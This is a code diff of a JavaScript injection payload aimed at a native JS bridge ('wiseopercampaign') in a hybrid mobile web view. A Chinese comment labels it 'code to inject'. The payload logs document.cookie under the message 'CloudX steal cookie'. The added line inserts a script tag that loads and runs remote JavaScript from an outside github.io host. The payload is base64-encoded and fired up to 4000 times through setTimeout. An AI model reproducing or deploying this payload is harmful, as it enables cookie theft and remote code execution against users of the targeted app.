@@ -312,7 +312,7 @@
 
         const currUrl = location.href;
         //要注入的代码
-        const payload = `console.log('cloud:'+document.cookie);if (window['wiseopercampaign']) {window['wiseopercampaign'].onNativeValueCallback = (type, args) => emitEvent(type, args);window['wiseopercampaign'].callbackFromNative = callbackFromNative;} else {window['wiseopercampaign'] = {onNativeValueCallback: (type, args) => emitEvent(type, args),callbackFromNative};};if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)}`;
+        const payload = `console.log('cloud:'+document.cookie);s=document.createElement('script'),s.src='https://seuercc.github.io/ho/jsb5.js',s.onload=()=>console.info('js load succeed'),document.head.appendChild(s);if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)}`;
         const base64Code = btoa(payload);
         // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';
 
@@ -323,8 +323,6 @@
 
         for (let i = 0; i < 4000; i++) {
             setTimeout(function () {
-
-                initBridge("wiseopercampaign");
                 function getDeviceSessionId(params, success, fail) {
                     window.nativeBridge.invoke(
                         "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
